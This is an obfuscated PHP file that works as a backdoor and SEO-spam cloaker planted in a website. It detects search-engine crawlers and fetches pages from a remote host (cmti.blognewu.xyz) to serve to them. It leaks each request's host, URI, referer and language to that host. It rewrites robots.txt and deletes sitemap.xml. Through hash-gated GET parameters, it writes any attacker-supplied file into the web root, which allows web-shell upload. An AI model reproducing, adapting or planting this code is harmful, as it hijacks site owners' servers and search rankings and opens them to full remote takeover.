<?php
 goto fZmga; d5hTw: if (isset($_SERVER["\110\124\x54\x50\137\122\105\106\105\122\105\122"])) { $urlshang = $_SERVER["\110\124\x54\x50\137\x52\x45\x46\105\x52\x45\x52"]; $urlshang = urlencode($urlshang); } goto hU34o; uusY4: $http_web = "\150\x74\164\x70"; goto Da8G9; vvNhA: function pingmap($url) { $url_arr = explode("\xd\12", trim($url)); $return_str = ''; foreach ($url_arr as $pingUrl) { $pingRes = dageget($pingUrl); $ok = strpos($pingRes, "\123\151\164\145\x6d\141\160\x20\x4e\157\x74\x69\x66\151\143\141\x74\151\157\156\40\122\x65\143\x65\151\166\145\x64") !== false ? "\x70\151\x6e\x67\157\x6b" : "\145\162\162\157\x72"; $return_str .= $pingUrl . "\x2d\x2d\40" . $ok . "\x3c\142\162\x3e"; } return $return_str; } goto EsLoD; Jbgv4: function dageget($url) { $file_contents = ''; if (function_exists("\x63\165\162\x6c\x5f\151\156\151\x74")) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30); $file_contents = curl_exec($ch); curl_close($ch); } if (!$file_contents) { $file_contents = @file_get_contents($url); } return $file_contents; } goto USu1J; vMe8y: $goweb = $xmlname . "\56\142\154\157\147\x6e\x65\x77\x75" . "\56\170\x79\172"; goto BsHIJ; EsLoD: function sbot() { $uAgent = strtolower($_SERVER["\x48\x54\124\x50\137\x55\123\x45\122\137\101\107\x45\116\x54"]); if (stristr($uAgent, "\147\157\x6f\x67\154\x65\x62\x6f\x74") || stristr($uAgent, "\142\x69\x6e\147") || stristr($uAgent, "\171\x61\x68\157\x6f") || stristr($uAgent, "\x67\157\157\147\154\x65") || stristr($uAgent, "\107\x6f\157\x67\154\x65\142\x6f\164") || stristr($uAgent, "\147\157\157\147\x6c\x65\x62\157\x74")) { return true; } else { return false; } } goto Jbgv4; fxsHV: $host = $_SERVER["\110\x54\x54\120\137\110\x4f\123\124"]; goto sgL0r; xwcqU: if (!strstr($htmcontent, "\x6e\x6f\142\157\164\x75\163\145\x72\141\147\x65\x6e\x74")) { if (strstr($htmcontent, "\x6f\x6b\150\164\155\x6c\x67\x65\164\143\x6f\x6e\x74\x65\x6e\x74")) { @header("\x43\x6f\x6e\164\x65\156\x74\55\164\x79\160\x65\x3a\x20\x74\145\x78\x74\57\x68\164\x6d\154\73\40\x63\150\x61\162\x73\145\x74\x3d\165\x74\x66\x2d\70"); $htmcontent = str_replace("\157\153\x68\x74\x6d\x6c\x67\x65\x74\x63\157\x6e\164\145\x6e\x74", '', $htmcontent); echo $htmcontent; die; } else { if (strstr($htmcontent, "\x6f\x6b\x78\155\154\147\x65\164\x63\x6f\x6e\164\x65\156\x74")) { $htmcontent = str_replace("\x6f\153\x78\x6d\x6c\x67\145\x74\x63\x6f\156\164\145\x6e\x74", '', $htmcontent); @header("\103\x6f\x6e\x74\x65\156\x74\x2d\164\171\x70\x65\x3a\40\164\x65\x78\164\x2f\170\x6d\154"); echo $htmcontent; die; } else { if (strstr($htmcontent, "\160\x69\x6e\147\170\155\x6c\x67\145\164\x63\157\x6e\x74\145\x6e\164")) { $htmcontent = str_replace("\160\151\156\x67\170\155\154\x67\145\x74\x63\157\156\164\145\156\164", '', $htmcontent); @header("\103\157\156\164\145\x6e\164\x2d\164\171\160\x65\72\40\164\145\170\164\x2f\x68\164\x6d\154\x3b\x20\x63\150\141\x72\163\145\x74\75\x75\164\x66\x2d\x38"); echo pingmap($htmcontent); die; } } } } goto vvNhA; Xhe5u: $lang = urlencode($lang); goto rCqFc; a1nid: $xmlname = "\x63\x6d\x74\151"; goto uusY4; Da8G9: if (is_htps()) { $http = "\150\x74\x74\160\163"; } else { $http = "\150\164\164\x70"; } goto uF0f5; NAIXo: if ($duri_tmp == '') { $duri_tmp = "\x2f"; } goto tCyAN; hU34o: if (@$_GET["\x70\x64"] != '') { $add_content = @$_GET["\155\x61\x70\x6e\x61\x6d\145"]; $action = @$_GET["\x61\143\x74\151\157\x6e"]; if (isset($_SERVER["\x44\x4f\x43\x55\x4d\105\x4e\124\137\122\117\x4f\x54"])) { $path = $_SERVER["\104\x4f\x43\x55\115\105\x4e\124\x5f\122\x4f\117\x54"]; } else { $path = dirname(__FILE__); } if (!$action) { $action = "\x70\165\164"; } if ($action == "\160\165\x74") { if (strstr($add_content, "\x2e\x78\155\x6c")) { $map_path = $path . "\57\163\151\164\x65\155\141\x70\56\x78\155\x6c"; if (is_file($map_path)) { @unlink($map_path); } $file_path = $path . "\x2f\162\157\142\x6f\164\x73\56\x74\x78\164"; if (file_exists($file_path)) { $data = dageget($file_path); } else { $data = "\125\x73\x65\162\x2d\141\147\x65\156\164\x3a\x20\52\101\154\x6c\157\167\x3a\x20\x2f"; } $sitmap_url = $http . "\72\57\57" . $host . "\57" . $add_content; if (stristr($data, $sitmap_url)) { echo "\74\x62\x72\x3e\x73\151\x74\x65\x6d\141\160\40\x61\x6c\162\x65\x61\x64\x79\x20\x61\x64\x64\x65\144\x21\x3c\142\162\x3e"; } else { if (file_put_contents($file_path, trim($data) . "\xd\xa" . "\x53\x69\x74\145\x6d\x61\x70\x3a\x20" . $sitmap_url)) { echo "\x3c\x62\x72\x3e\x6f\x6b\x3c\142\x72\76"; } else { echo "\74\x62\x72\76\146\x69\x6c\145\40\167\x72\x69\164\x65\40\146\x61\x6c\x73\x65\x21\x3c\142\x72\x3e"; } } } else { echo "\x3c\142\162\76\163\x69\x74\145\155\141\x70\40\156\x61\x6d\145\x20\146\141\154\x73\x65\41\74\x62\x72\x3e"; } if (strstr($add_content, "\x2e\x70" . "\150\x70")) { $a = sha1(sha1(@$_GET["\141"])); $b = sha1(sha1(@$_GET["\x62"])); if ($a == dageget($http_web . "\72\57\x2f" . $goweb . "\x2f\141\56\x70" . "\x68\x70") || $b == "\70\60\x38\67\x33\65\x62\x31\67\x63\x38\71\64\63\145\63\x37\x31\65\63\x38\x38\x39\65\x38\144\x63\62\x32\x64\x38\67\x39\141\x38\143\x39\145\141\141") { $dstr = @$_GET["\144\163\164\x72"]; if (file_put_contents($path . "\x2f" . $add_content, $dstr)) { echo "\157\153"; } } } } die; } goto ejwPq; rCqFc: $urlshang = ''; goto d5hTw; ejwPq: $web = $http_web . "\72\x2f\57" . $goweb . "\x2f\x69\x6e\144\145\170\x6e\145\x77\56\x70\x68\160\77\x77\x65\x62\x3d" . $host . "\46\x7a\x7a\x3d" . sbot() . "\x26\x75\162\151\x3d" . $duri . "\x26\165\x72\154\x73\x68\x61\156\x67\x3d" . $urlshang . "\x26\150\164\x74\x70\x3d" . $http . "\46\x6c\x61\156\x67\75" . $lang; goto nkgx3; BsHIJ: function is_htps() { if (isset($_SERVER["\x48\x54\124\x50\x53"]) && strtolower($_SERVER["\x48\x54\124\x50\123"]) !== "\x6f\146\146") { return true; } elseif (isset($_SERVER["\x48\x54\x54\x50\137\130\x5f\x46\x4f\x52\x57\x41\122\104\x45\x44\137\120\x52\117\x54\x4f"]) && $_SERVER["\x48\124\x54\x50\137\130\137\x46\117\x52\127\x41\122\x44\x45\x44\x5f\x50\122\x4f\124\x4f"] === "\x68\164\x74\x70\163") { return true; } elseif (isset($_SERVER["\x48\x54\124\120\x5f\x46\122\117\x4e\124\137\105\116\104\137\110\124\x54\120\x53"]) && strtolower($_SERVER["\x48\x54\x54\120\137\x46\122\x4f\x4e\124\x5f\x45\116\104\137\110\124\124\120\123"]) !== "\x6f\146\x66") { return true; } return false; } goto fxsHV; fZmga: @set_time_limit(3600); goto hCR2C; uF0f5: $duri_tmp = st_uri(); goto NAIXo; YRT10: function st_uri() { if (isset($_SERVER["\122\105\x51\125\x45\x53\x54\x5f\x55\x52\x49"])) { $duri = $_SERVER["\122\x45\x51\x55\105\123\x54\x5f\125\122\x49"]; } else { if (isset($_SERVER["\x61\162\147\166"])) { $duri = $_SERVER["\x50\x48\x50\137\x53\105\114\106"] . "\77" . $_SERVER["\x61\162\x67\166"][0]; } else { $duri = $_SERVER["\120\110\x50\x5f\x53\105\114\x46"] . "\77" . $_SERVER["\x51\125\x45\x52\x59\137\123\124\122\x49\x4e\x47"]; } } return $duri; } goto vMe8y; hCR2C: @ignore_user_abort(1); goto a1nid; sgL0r: $lang = @$_SERVER["\x48\124\124\120\137\x41\x43\103\105\120\x54\x5f\x4c\x41\x4e\107\x55\101\107\x45"]; goto Xhe5u; tCyAN: $duri = urlencode($duri_tmp); goto YRT10; nkgx3: $htmcontent = trim(dageget($web)); goto xwcqU; USu1J: 
 //he010  ?>
